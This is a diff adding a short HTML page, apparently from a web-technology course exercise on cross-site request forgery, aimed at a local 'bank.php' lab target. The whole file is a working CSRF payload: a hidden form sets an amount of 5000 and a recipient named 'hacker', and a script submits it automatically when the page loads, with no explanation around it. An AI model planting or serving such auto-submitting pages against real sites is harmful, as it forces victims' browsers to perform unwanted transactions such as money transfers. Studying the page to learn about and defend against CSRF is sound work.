@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<form id="attack" action="http://localhost/WebTechnology-II/21-CrossSideRequestForgery/bank.php" method="POST">
+    <input type="hidden" name="amount" value="5000">
+    <input type="hidden" name="to" value="hacker">
+</form>
+
+<script>
+document.getElementById("attack").submit();
+</script>
+
+</body>
+</html>
